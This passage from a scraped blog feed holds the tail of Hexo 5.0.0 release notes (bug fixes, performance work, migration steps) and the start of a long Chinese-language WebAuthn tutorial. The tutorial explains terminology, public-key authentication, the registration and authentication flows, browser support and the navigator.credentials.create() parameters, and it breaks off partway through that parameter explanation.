标签插件在找不到对应文章时将会显示警告信息</li>\n<li>\n<code>post_permalink</code> 配置项新增支持 <code>:second</code> 属性</li>\n<li>当文章的标签插件出现渲染错误时，报错信息将会显示出错文件的路径</li>\n</ul>\n<h2>修复的 Bug</h2>\n<ul>\n<li>修复了 数个相邻的标签插件 无法渲染的 Bug</li>\n<li>修复了 文章中的代码块由于包含大括号（<code>{</code> 和 <code>}</code>）导致的渲染失败</li>\n<li>修复了 包含 Source Map 的 Hexo 插件无法加载的 Bug</li>\n<li>修复了 <code>code</code> 标签插件无法解析 <code>wrap</code> 选项的问题</li>\n<li>当 <code>post_asset_folder</code> 功能启用时，<code>hexo new</code> 命令将不再生成错误的 <code>index</code> 目录</li>\n</ul>\n<h2>性能改进</h2>\n<p>一如既往，Hexo 5.0.0 也带来了一系列性能改进，以提升 Hexo 的渲染性能。</p>\n<ul>\n<li>改进了标签插件的渲染性能</li>\n<li>优化了 <code>meta[generator]</code> 标签注入的逻辑</li>\n<li>优化为外部链接添加 <code>rel=noopenner</code> 和 <code>target=\"_blank\"</code> 功能的性能</li>\n<li>确保 <code>after_render:html</code> Filter 在每个页面只执行一次</li>\n<li>优化了 Filter API 的执行速度</li>\n<li>延迟加载代码高亮，减少 Hexo 启动用时</li>\n<li>当执行 <code>hexo clean</code> 时不再加载无关的插件</li>\n</ul>\n<h2>从 Hexo 4.x 升级到 Hexo 5.x</h2>\n<p>Hexo 5.0.0 引入了少数不向后兼容的功能，因此当你升级到 Hexo 5.0.0 时，需要遵循以下步骤进行迁移：</p>\n<h3>升级 Node.js</h3>\n<p>Hexo 5.0.0 不再支持 Node.js 8 及更低版本。为了使用 Hexo 5.0.0，请确保 Node.js 版本不低于 10.13.0。</p>\n<h3>文章 Front-Matter 不再支持 keywords 字段</h3>\n<p>过去这一字段被主要用于 <code>open_graph</code> 辅助函数。升级到 Hexo 5.0.0 后你无需去除现有文章的 Front-Matter 中的 <code>keywords</code> 字段，但这一字段将不会再起任何作用。</p>\n<h3>文章 Front-Matter 中 permalink 字段的行为</h3>\n<p>Hexo 5.0.0 修改了在文章的 Front Matter 中指定 <code>permalink</code> 字段的行为，与独立页面的 <code>permalink</code> 的行为一致。</p>\n<h3>全局变量中不再包含 Lodash</h3>\n<p>Hexo 5.0.0 去除了全局变量中的 Lodash，因此主题无法继续在模板中使用 Lodash。主题开发者应该遵循 <a href=\"https://github.com/you-dont-need/You-Dont-Need-Lodash-Underscore\">You-Dont-Need-Lodash-Underscore</a> 进行迁移。</p>\n<h3>用 updated_option 配置代替 use_date_for_updated</h3>\n<p>Hexo 4.0.0 提供的 <code>use_date_for_updated</code> 配置项现已被 <code>updated_option</code> 替代。</p>\n<ul>\n<li>\n<code>use_date_for_updated: true</code> 现在等价于 <code>updated_option: 'date'</code>。</li>\n<li>\n<code>use_date_for_updated: false</code> 现在等价于 <code>updated_option: 'mtime'</code>。</li>\n</ul>\n<div class=\"license\"> <div class=\"license-title\">Hexo 5.0.0 正式发布</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hexo-5/\">https://blog.skk.moe/post/hexo-5/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-07-24</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hexo-5/"},{"title":"谈谈 WebAuthn","date":"2020-03-23 14:57:59","description":"\n<p>WebAuthn，即 Web Authentication，是一个用于在浏览器上进行认证的 API，W3C 将其表述为 “An API for accessing Public Key Credentials”，即“一个用于访问公钥凭证的 API”。WebAuthn 很强大，强大到被认为是 Web 身份认证的未来（当然，也很复杂）。你有想过通过指纹或者面部识别来登录网站吗？WebAuthn 就能在保证安全和隐私的情况下让这样的想法成为现实。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/wwa.gif\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/wwa.gif?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"通过 WebAuthn 调起 Windows Hello 登录网站\" width=\"1912\" height=\"966\" class=\"aligncenter size-full wp-image-2215\"></a>\n<p>你可以在<a href=\"https://webauthn.io/\" rel=\"noopener\">这个网站</a>自行体验 WebAuthn。或者，如果你有一个使用 WordPress 的站点，可以尝试一下 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WP-WebAuthn</a> 这款插件，它可以为你的站点启用 WebAuthn 登录。这是我为了写这篇文章而练手开发的插件，本文中的部分示例代码也来自这款插件。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"wp-webauthn\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/wp-webauthn\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>WebAuthn Level 1 标准已在 2019 年 3 月成为 W3C 推荐标准，而 Level 2 标准目前也已进入编辑草案阶段，但互联网上有关它的中文资料却仍然很少，国内也鲜有网站支持这一新标准。于是，在抱着各种英文资料和标准啃了几天以后，我折腾出了这篇文章。</p>\n<p>在这篇文章里，我将会从最基本的概念开始，逐渐深入 WebAuthn，直到解码公钥等深层细节。这可能是你能找到的有关 WebAuthn 最详细最基础的中文文章，也很可能是最长的。在开始之前，<strong>我强烈建议你打开菜单中的文章目录浏览一遍，以对这篇文章涉及的内容有所了解。</strong>如果你只是想了解如何简单地在你的项目中添加对 WebAuthn 的支持，那么“<a href=\"https://flyhigher.top/#webauthn-overview\">浅谈 WebAuthn</a>”部分就是你要找的；如果你想了解更多关于 WebAuthn 的底层细节，那么你可以继续阅读“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”部分。</p>\n<p>由于在本文写作时 WebAuthn Level 2 规范尚未定稿，<strong>这篇文章我们将只专注于 Level 1 规范。</strong></p>\n<p>这篇文章最后更新于 2020.9 ，在你读到这篇文章时，部分事实可能已经发生改变，请注意判断。</p>\n<p><strong>更新日志：</strong></p>\n<ul>\n<li>2021.1.16 添加 Chrome 开发工具信息</li>\n<li>2020.9.17 更新 iOS/iPad OS 兼容性信息</li>\n<li>2020.5.20 添加部分无用户名认证的平台兼容性内容</li>\n<li>2020.5.15 添加部分 <code>extensions</code> 相关内容与链接；添加全局凭证 ID 唯一内容；添加凭证 ID 查找相关内容；添加“从 U2F 认证迁移”一节</li>\n<li>2020.4.13 更新与修正 <code>userVerification</code> 相关内容；添加部分 Firefox 相关内容</li>\n<li>2020.3.23 文章发布</li>\n</ul>\n<p>那么让我们开始吧。<span></span></p>\n<h1>浅谈 WebAuthn</h1>\n<p>在这个部分里，我们将会从基础概念开始，了解有关 WebAuthn 和密码学的一些基础知识，并最终使用第三方库实现基础的 WebAuthn 认证。如果你已经对这些内容有所了解了，可以跳到“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”继续阅读。</p>\n<h2>为什么使用 WebAuthn</h2>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/2.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"钓鱼邮件\" width=\"709\" height=\"693\" class=\"aligncenter size-full wp-image-2162\"></a>\n<p>相信你一定收到过类似的邮件吧？只要你点进那个最显眼的链接，你就会进入一个设置好的圈套——钓鱼网站。如果你一时糊涂在这类网站上填写了你的账号和密码，bingo，你的账号就不再是你的账号了。</p>\n<p>不过，就算你警惕心再强，也无法避免密码泄露事件。Twitter, Facebook 等都爆出过明文密码泄露事件，证明再大的公司或组织也无法避免密码泄露问题。雪上加霜的是，很大一部分用户都非常喜欢使用重复密码，这就导致一次密码泄露会牵连很多网站，用户的账户安全性完全无法得到保证。</p>\n<p>那么，有什么办法解决这些问题吗？<strong>彻底解决的方法只有一个，那就是抛弃密码。</strong>可是没有密码还怎么验证用户身份呢？这就是 WebAuthn 的用武之地了。</p>\n<p><del>没有密码的好时代，来临力！</del></p>\n<h2>什么是 WebAuthn</h2>\n<p>那么到底什么是 WebAuthn 呢？如开头所说，WebAuthn 是“一个用于访问公钥凭证的 API”，网站可以通过这个 API 进行一些高安全性的身份验证。WebAuthn 一个最常见的应用就是用于网站登录时的 2FA（双重因素验证）甚至是无密码登录。通过网页调用 WebAuthn，在不同平台下，<strong>我们可以实现通过 USB Key、指纹、面部甚至虹膜扫描来认证身份，同时确保安全和隐私。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/4-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/4-3.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"WebAuthn 可使用的各种身份认证方式\" width=\"1294\" height=\"566\" class=\"aligncenter size-full wp-image-2213\"></a>\n<p>WebAuthn 标准是 FIDO2 标准的一部分，而 FIDO2 则是由 FIDO 联盟和 W3C 共同推出的 U2F（现称作 FIDO1）的后继标准，旨在增强网络认证的安全性。</p>\n<blockquote><p>你可能了解过 U2F，那么 U2F 和 FIDO2 的区别在哪里呢？从名字上可以看出，U2F，即“通用第二因素协议”，是专注于作为密码后的第二道屏障的，而 FIDO2 增加了单因素认证功能，这意味着使用 FIDO2 可以完全替代密码，真正实现无密码登录。</p></blockquote>\n<p>FIDO2 标准主要包括四个部分，其一是用于网站和访客设备交互的 WebAuthn，而 Client to Authenticator Protocol 2（CTAP2，客户端-认证器协议）作为 WebAuthn 的补充，则是用于访客的设备和认证器交互的协议。标准的其他两个部分则是 U2F 和 UAF 规范。在这篇文章中，我们只关心 WebAuthn，不会涉及 CTAP, U2F 和 UAF 的相关知识。如果你对这段话中的一些概念不了解，不要紧张，接下来我们就来谈谈 WebAuthn 中一些常用的术语和概念。</p>\n<blockquote><p>WebAuthn 只能在安全上下文中使用，也就是说，页面需要使用 HTTPS 协议或是处于 <code>localhost</code> 中。</p></blockquote>\n<h2>常用术语和概念</h2>\n<p>WebAuthn 中有许多不常碰到的术语，不过我只会在这里介绍一些常用的术语和概念——如果你只是希望做出一个简单的实现，那么了解这一段中的一些概念就足够了。同时，由于我实在没能找到一部分术语的通用翻译，有一些术语我按着自己的理解尽可能地翻译了，有任何问题请告诉我。</p>\n<p>在一个完整的 WebAuthn 认证流程中，通常有这么几个角色：</p>\n<ul>\n<li>Relying Party 依赖方 (RP) ：指服务提供方，即网站</li>\n<li>User 用户：正准备登录的你</li>\n<li>Authenticator 认证器：通常指 USB Key 或是设备内置的指纹扫描器、虹膜扫描器、面部识别装置等，正是它们在使用流程中代替了密码甚至是用户名</li>\n<li>User Agent 用户代理：通常指浏览器或系统，负责与认证器交互</li>\n</ul>\n<p>认证过程通常分为两种：</p>\n<ul>\n<li>Registration Ceremony 注册仪式：用户向账户上添加认证器</li>\n<li>Authentication Ceremony 验证仪式：用户通过已注册的认证器验证身份</li>\n</ul>\n<p>同时，认证过程中还会产生这些内容：</p>\n<ul>\n<li>Challenge 挑战：通常是一串随机字符串</li>\n<li>Public Key Credential 公钥凭证：由认证器产生的凭证，在技术上代替了密码</li>\n<li>Attestation 证明：注册时认证器产生的验证数据</li>\n<li>Assertion 断言：验证时认证器产生的验证数据</li>\n</ul>\n<blockquote><p><strong>请注意区分证明 (Attestation) 和断言 (Assertion)</strong>，特别是在这两个单词有些相似的情况下。在 WebAuthn 中，它们是不同过程中的类似概念，但并不相同。</p></blockquote>\n<p>如果你对于这些内容不是很理解，没有关系，我们会在“<a href=\"https://flyhigher.top/#how-to-webauthn\">使用流程</a>”一节中将这些概念放到实际情况中解释，你只要先区分这些概念即可。</p>\n<h2>安全性的基础</h2>\n<p>WebAuthn 为什么安全？和 HTTPS 一样，WebAuthn 使用非对称加密的思路来保证安全性，但侧重点又有所不同。要理解 WebAuthn 的认证流程，我们必须对非对称加密有所了解。如果你对非对称加密比较熟悉了，就直接跳到下一段吧。</p>\n<p>WebAuthn 的核心在于“认证”，即保证产生了凭证的认证器是用户的认证器，而不是第三方在伪造凭证。但为什么要使用非对称加密呢？我们可以先来看看对称加密。</p>\n<p>让我们假设小明和小红相互写信，见不到对方。这天小红突然想，给自己写信的人是不是真的小明呢？于是小红要求对方向小红证明自己是小明。怎么证明呢？他们商量出来这么一套方案：</p>\n<ol>\n<li>在小明的身份已经验证的情况下，小明和小红商量一个统一的密码和密钥</li>\n<li>一段时间后，在小红要求小明验证身份时，小红发送一段文本给小明</li>\n<li>小明用提前和小红商量好的密码和密钥加密文本后发回给小红</li>\n<li>小红使用相同的密码和密钥解密文本，如果得到文本和之前发送的一致，就表明对方拥有正确的密码和密钥</li>\n</ol>\n<blockquote><p>在密码学中，我们通常把“加密算法”称为密码 (code)，和通常登录时用的密码 (password) 并非同一个概念。</p></blockquote>\n<p>在这种情况下，<strong>只要密钥不泄露</strong>，即拥有正确密钥的只有小明和小红，那么小红就能确定对方一定是小明。但这样的问题也很明显，如果小明和小红不能见面，那么他们就必须先以明文交换密码——<strong>在这个过程中一旦有人窃取到了密码，这个认证就无效了。</strong></p>\n<p>这时我们就需要使用<strong>非对称加密</strong>来拯救破碎的信任了。非对称加密的基础是一对密钥，也就是公钥和私钥，它们是互相关联但（几乎）无法互相推导的。在非对称加密的过程中，选择相同的密码后，使用私钥加密明文得到的密文只能由对应的公钥解密，无法使用私钥解密，同时这个过程反过来也是成立的。</p>\n<blockquote><p>本文的核心并不是非对称加密算法，因此不会详述非对称加密在数学上的证明，若有兴趣可以自行了解。</p></blockquote>\n<p>这就完美解决密钥泄露的问题了。让我们回过头来看之前的例子。现在小明和小红决定使用非对称加密来证明身份，过程如下：</p>\n<ol>\n<li>在小明的身份已经验证的情况下，小明提前生成一对公私钥，将公钥发送给小红，私钥自己保管，同时商量好统一的密码</li>\n<li>一段时间后，在小红要求小明验证身份时，小红发送一段文本给小明</li>\n<li>小明使用商量好的密码和自己的私钥加密文本，发送给小红</li>\n<li>小红使用相同的密码和小明的公钥解密文本，如果得到文本和之前发送的一致，就表明对方拥有正确的密码和私钥</li>\n</ol>\n<p>在这种情况下，<strong>只要私钥不泄露</strong>，那么小红解密得到的文本和之前发送的一致，那么就可以证明收到的密文一定是由小明加密后发送过来的。而在整个过程中，私钥都没有离开过小明，更没有经过传输，也就几乎没有泄露的可能了。这时，小红终于可以确定对面和她通信的人的确是小明了。</p>\n<p>题外话：HTTPS 虽然也应用了非对称加密，但 HTTPS 更侧重于“加密”而非“认证”，因此思路上会有些许差异。要了解关于 HTTPS 和非对称加密的更多信息，你可以阅读我之前写的这篇文章：</p>\n<p></p>\n<div class=\"mdx-post-cot\" data-mdxposturl=\"https://flyhigher.top/develop/1093.html\"><div class=\"mdx-post-wait-out-c2\"><div class=\"mdx-post-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://flyhigher.top/develop/1093.html\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<span></span>\n<h2>使用流程</h2>\n<p>了解了非对称加密，我们就可以来看看 WebAuthn 的认证流程了。</p>\n<p>和普通的密码一样，<strong>使用 WebAuthn 分为两个部分，注册和验证。</strong>注册仪式会在依赖方中将认证器的一些信息和用户建立关联；而验证仪式则是验证这些信息以登确保是用户本人在登录。根据上一节的思路，我们可以知道，注册仪式就是认证器生成一对公私钥，然后将公钥交给依赖方；而验证仪式是依赖方发送给认证器一段文本，要求认证器用自己的私钥加密后发回以验证。</p>\n<p>在实际情况中，WebAuthn 是基于<strong>挑战-应答模型</strong>工作的。要更好地理解，我们直接来看具体流程。先来看看注册的流程。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc1.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc1.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"WebAuthn 注册流程\" width=\"1100\" height=\"604\" class=\"aligncenter size-full wp-image-2224\"></a>\n<ol>\n<li>浏览器向依赖方发送某个用户的注册请求</li>\n<li>依赖方向浏览器发送挑战、依赖方信息和用户信息</li>\n<li>浏览器向认证器发送挑战、依赖方信息、用户信息和客户端信息以请求创建公钥凭证</li>\n<li>认证器请求用户动作，随后创建一对公私钥，并使用私钥签名挑战（即证明），和公钥一起交给浏览器</li>\n<li>浏览器将签名后的挑战和公钥发送给依赖方</li>\n<li>依赖方用公钥验证挑战是否与发送的一致，如果成功则将公钥与用户绑定，注册完成</li>\n</ol>\n<p>我也做了一个交互式的 Demo，你可以对照流程来更好地理解。</p>\n<p><button class=\"mdui-btn mdui-btn-raised mdui-ripple mdui-color-theme-accent\">开始注册</button> <span></span></p>\n<div></div>\n<blockquote><p>注意，这个 Demo 和下方的 Demo 都只是一个本地模拟的简单示例，没有任何数据会被上传，当然也不会对数据进行验证。</p></blockquote>\n<p>而之后的验证流程如下：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc2.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"WebAuthn 验证流程\" width=\"1100\" height=\"604\" class=\"aligncenter size-full wp-image-2226\"></a>\n<ol>\n<li>浏览器向依赖方发送某个用户的验证请求</li>\n<li>依赖方向浏览器发送挑战</li>\n<li>浏览器向认证器发送挑战、依赖方信息和客户端信息以请求获取公钥凭证</li>\n<li>认证器请求用户动作，随后通过依赖方信息找到对应私钥，并使用私钥签名挑战（即断言），交给浏览器</li>\n<li>浏览器将签名后的挑战发送给依赖方</li>\n<li>依赖方用之前存储的公钥验证挑战是否与发送的一致，一致则验证成功</li>\n</ol>\n<p><button class=\"mdui-btn mdui-btn-raised mdui-ripple mdui-color-theme-accent\" disabled>开始验证</button> <span>在上方注册后才能验证</span></p>\n<div></div>\n<p>可以看到，WebAuthn 不仅在理论上是安全的，同时<strong>在整个过程中并没有隐私数据被传输</strong>——用户信息实际上只包含用户名和用户 ID。因此我们完全可以说 WebAuthn 是安全且私密的。</p>\n<blockquote><p>为了避免用户在不同依赖方之间被追踪，认证器通常会为每个依赖方和用户的组合都创建一对公私钥。不过，由于认证器的存储空间有限，认证器通常不会存储每一个私钥，而是会通过各类信息和烧录在认证器内的主密钥“算”出对应的私钥以实现无限对公私钥。具体算法根据不同厂商会有所不同。对于 Yubikey，你可以在<a href=\"https://developers.yubico.com/U2F/Protocol_details/Key_generation.html\">这里</a>了解更多。</p></blockquote>\n<blockquote><p>如果依赖方需要，用户同意后，发送给依赖方的公钥凭证中可以包含用于辨认认证器型号的信息，不过这对隐私的影响微乎其微。</p></blockquote>\n<h2>浏览器接口</h2>\n<p>要使用 WebAuthn，我们必须要依靠浏览器作为媒介和验证器进行交互，而这就需要浏览器对于 WebAuthn 的支持了。绝大多数新版本的现代浏览器都为 WebAuthn 提供了统一的接口，而在这一段中我们会了解如何使用相关的接口。但是在开始之前，我们可以先来看看浏览器的支持程度（2020.9）。</p>\n<div class=\"mdui-table-fluid\"><table class=\"mdui-table\">\n<thead><tr>\n<th>浏览器</th>\n<th>支持情况</th>\n</tr></thead>\n<tbody>\n<tr>\n<td>桌面端 Chrome</td>\n<td>67+</td>\n</tr>\n<tr>\n<td>移动端 Chrome</td>\n<td>67+<sup>[1]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Firefox</td>\n<td>60+</td>\n</tr>\n<tr>\n<td>移动端 Firefox</td>\n<td>不支持<sup>[2]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Edge</td>\n<td>18+</td>\n</tr>\n<tr>\n<td>移动端 Edge</td>\n<td>不支持<sup>[3]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Safari</td>\n<td>13+</td>\n</tr>\n<tr>\n<td>移动端 Safari</td>\n<td>13.3+<sup>[4]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Opera</td>\n<td>54+</td>\n</tr>\n<tr>\n<td>移动端 Opera</td>\n<td>不支持</td>\n</tr>\n</tbody>\n</table></div>\n<p><sup>[1]</sup> 受平台限制，Chrome 在 iOS 平台上不支持 WebAuthn，在 Android 平台上支持大部分 WebAuthn 功能，但仍不支持部分特性（如 <code>userVerification</code>）。<br><sup>[2]</sup> 移动端 Firefox 80 以下的版本支持 WebAuthn 但似乎会忽略 <code>authenticatorAttachment</code> 等一部分参数，同时移动端 Firefox Beta 80 以下的版本支持 WebAuthn 但无法成功调用。自 80 版本起移动端 Firefox 暂时取消了对 WebAuthn 的支持（可能是 Bug）。<br><sup>[3]</sup> 移动端 Edge 似乎支持 WebAuthn 但无法成功调用。<br><sup>[4]</sup> Safari iOS/iPad OS 13 仅支持外部认证器，无法调用 Touch ID 或 Face ID；自 iOS/iPad OS 14 起 Safari 已支持全功能 WebAuthn，可以调用 Touch ID/Face ID</p>\n<p>当然，一众国产浏览器，包括 Samsung Browser 和 Yandex Browser，目前都不支持 WebAuthn。此外，由于 WebAuthn 涉及外部验证器和 TPM 可信平台模块等，用户的操作系统也会对 WebAuthn 的可用性造成影响。以下是一些需要注意的信息：</p>\n<ul>\n<li>Windows 10 1903 以下版本仅 Edge 能提供完整支持，其他浏览器只能使用 USB Key 等外部认证器；1903+ 中所有浏览器都可以通过 Windows Hello 带来完整的 WebAuthn 支持</li>\n<li>Android 需要安装并开启 Google 服务</li>\n<li>iOS/iPad OS 13.3 以下的版本不支持 WebAuthn，iOS/iPad OS 14 以下的版本支持有限（参考上文），iOS/iPad OS 14 开始 Safari 已支持全功能 WebAuthn（功能完整度甚至超过了 Android）</li>\n</ul>\n<p>可以看出，WebAuthn 的发展之路仍然很漫长，但好在桌面端对它的支持已经比较完善了，在一些情况下我们完全有理由使用它。</p>\n<hr>\n<p>来看看浏览器提供了怎么样的接口吧。要使用 WebAuthn，我们可以使用 <code>navigator.credentials.create()</code> 请求认证器生成公钥凭证和 <code>navigator.credentials.get()</code> 请求获取公钥凭证。</p>\n<blockquote><p>你或许已经对 Credential Management API 有所了解了。通过这些 API，我们还可以实现一些有趣的特性，不过这值得另开一篇文章来讲了。</p></blockquote>\n<p>对于一个基础的实现，<code>navigator.credentials.create()</code> 需要传入的参数如下：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({\r\n    publicKey: {\r\n        challenge,\r\n        rp: {\r\n            id,\r\n            name\r\n        },\r\n        user: {\r\n            id,\r\n            name,\r\n            displayName\r\n        },\r\n        pubKeyCredParams: [\r\n            {\r\n                type: \"public-key\",\r\n                alg\r\n            }\r\n        ],\r\n        authenticatorSelection: {\r\n            authenticatorAttachment,\r\n            userVerification\r\n        },\r\n        excludeCredentials: [\r\n            {\r\n                id,\r\n                transports: [],\r\n                type: \"public-key\"\r\n            }\r\n        ],\r\n        timeout\r\n    }\r\n})</pre>\n<p>在 <code>navigator.credentials.create()</code> 方法中，我们必须传入一个对象，其中只有一对名为 <code>publicKey</code> 的键值。这指明了我们需要创建公钥凭证，而非普通的密码凭证。然后，在 <code>publicKey</code> 对象中设置这些常用参数：</p>\n<ul>\n<li>\n<code>challenge: Uint8Array</code>：转换为 <code>Uint8Array</code> 的挑战，长度至少为 16，建议为 32</li>\n<li>\n<code>rp: Object</code>：依赖方信息，其中有一项为必须：\n<ul>\n<li>\n<code>rp.id: String</code>：（可选）依赖方 ID，必须为当前域名或为当前域名的子集的域名（不是子域名）。如域名为 <code>test.123.example.com</code>，则依赖方 ID 可以是 <code>test.123.example.com</code>, <code>123.example.com</code> 或 <code>example.com</code>。不指定则默认使用当前域名</li>\n<li>\n<code>rp.name: String</code>：依赖方名称，用于方便用户辨认</li>\n</ul>\n</li>\n<li>\n<code>user: Object</code>：用户信息，其中有三项为必须：\n<ul>\n<li>\n<code>user.id: Uint8Array</code>：转换为 <code>Uint8Array</code> 的字符串。<strong>出于安全考量，这应尽可能不与任何用户信息相关联，如不要包含用户名、用户邮箱等</strong>\n</li>\n<li>\n<code>user.name: String</code>：登录用户名</li>\n<li>\n<code>user.dispalyName: String</code>：用于显示的用户名称，显示与否的具体行为取决于浏览器</li>\n</ul>\n</li>\n<li>\n<code>pubKeyCredParams: Array</code>：一个算法列表，指明依赖方接受哪些签名算法。列表的每一项都是一个对象，拥有两个属性：\n<ul>\n<li>\n<code>pubKeyCredParams[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>pubKeyCredParams[].alg: Number</code>：一个负整数，用于标明算法。具体算法对应的数字可以在 <a href=\"https://www.iana.org/assignments/cose/cose.xhtml#algorithms\">COSE</a> 找到</li>\n</ul>\n</li>\n<li>\n<code>authenticatorSelection: Object</code>：（可选）用于过滤正确的认证器，这里介绍常用的一个参数：\n<ul>\n<li>\n<code>authenticatorSelection.authenticatorAttachment: String</code>：（可选）指定要求的认证器类型。如果没有满足要求的认证器，认证可能会失败。该参数可以为 <code>null</code>（表示接受所有类型的认证器）或是以下两个值之一：\n<ul>\n<li>\n<code>platform</code>：表示仅接受平台内置的、无法移除的认证器，如手机的指纹识别设备</li>\n<li>\n<code>cross-platform</code>：表示仅接受外部认证器，如 USB Key</li>\n</ul>\n</li>\n<li>\n<code>authenticatorSelection.userVerification: String</code>：（可选）指定认证器是否需要验证“用户为本人 (User Verified, UV)”，否则只须“用户在场 (User Present, UP)”。具体验证过程取决于认证器（不同认证器的认证方法不同，也有认证器不支持用户验证），而对验证结果的处理情况则取决于依赖方。该参数可以为以下三个值之一：\n<ul>\n<li>\n<code>required</code>：依赖方要求用户验证</li>\n<li>\n<code>preferred</code>：（默认）依赖方希望有用户验证，但也接受用户在场的结果</li>\n<li>\n<code>discouraged</code>：依赖方不关心用户验证。对于 iOS/iPad OS 13，必须设置为此值，否则验证将失败</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>excludeCredentials: Array</code>：（可选）用于标识要排除的凭证，可以避免同一个用户多次注册同一个认证器。如果用户试图注册相同的认证器，用户代理会抛出 <code>InvalidStateError</code> 错误。数组中的每一项都是一个公钥凭证对象，包含以下属性：\n<ul>\n<li>\n<code>excludeCredentials[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>excludeCredentials[].id: Uint8Array</code>：要排除的凭证 ID</li>\n<li>\n<code>excludeCredentials[].transports: Array</code>：（可选）用于指定该凭证所需的认证器与用户代理的通信方式，可以包含以下的一或多个字符串：\n<ul>\n<li>\n<code>usb</code>：可以通过 USB 连接的认证器</li>\n<li>\n<code>nfc</code>：可以通过 NFC 连接的认证器</li>\n<li>\n<code>ble</code>：可以通过蓝牙连接的认证器</li>\n<li>\n<code>internal</code>：平台内置的、无法移除的认证器</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>timeout: Number</code>：（可选）方法超时时间的毫秒数，超时后将强制终止 <code>create()</code> 并抛出错误。若不设置，将使用用户代理的默认值；若太大或太小，则使用最接近的用户代理默认值范围中的值。推荐值为 5000-120000</li>\n</ul>\n<blockquote><p>对于 <code>pubKeyCredParams</code>，通常我们只需添加 ES256 (alg: -7) 算法即可兼容大部分外部认证器，此外，再添加 RS256 (alg: -257) 算法即可兼容大部分平台内置认证器（如 Windows Hello）。当然，前端添加算法之后，后端也需要相应的算法支持。</p></blockquote>\n<blockquote><p>对于 <code>userVerification</code>，由于默认值 “preferred” 并不能很好地被所有设备支持，因此无论在 <code>create()</code> 中还是 <code>get()</code> 中不指定该参数都会在 Chrome 中触发一条警告。具体请参阅<a href=\"https://chromium.googlesource.com/chromium/src/+/master/content/browser/webauth/uv_preferred.md\">这个页面</a>。</p></blockquote>\n<p>调用 <code>create()</code> 之后，我们就可以拿到一个 <code>Promise</code>，并可以在 <code>then</code> 中获得认证器返回的 <code>PublicKeyCredential</code> 对象。以下是一个 <code>create()</code> 返回的 <code>PublicKeyCredential</code> 对象的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">PublicKeyCredential {\r\n    rawId: ArrayBuffer(32) {},\r\n    response: AuthenticatorAttestationResponse {\r\n        attestationObject: ArrayBuffer(390) {},\r\n        clientDataJSON: ArrayBuffer(121) {}\r\n    },\r\n    id: \"VByF2w2hDXkVsevQFZdbOJdyCTGOrI1-sVEzOzsNnY0\",\r\n    type: \"public-key\"\r\n}</pre>\n<p>其中有：</p>\n<ul>\n<li>\n<code>id: String</code>：Base64URL 编码的凭证 ID</li>\n<li>\n<code>rawId: ArrayBuffer</code>：<code>ArrayBuffer</code> 的原始凭证 ID</li>\n<li>\n<code>type: String</code>：一定是 “public-key”</li>\n<li>\n<code>response: Object</code>：<code>AuthenticatorAttestationResponse</code> 对象，是 <code>PublicKeyCredential</code> 的主要部分，包含以下两个内容：\n<ul>\n<li>\n<code>response.clientDataJSON: ArrayBuffer</code>：客户端数据，包含 origin（即凭证请求来源）、挑战等信息</li>\n<li>\n<code>response.attestationObject: ArrayBuffer</code>：CBOR 编码的认证器数据，包含凭证公钥、凭证 ID、签名（如果有）、签名计数等信息</li>\n</ul>\n</li>\n</ul>\n<p>然后将 <code>ArrayBuffer</code> 们以合适的方式编码成字符串，我们就可以把 <code>PublicKeyCredential</code> 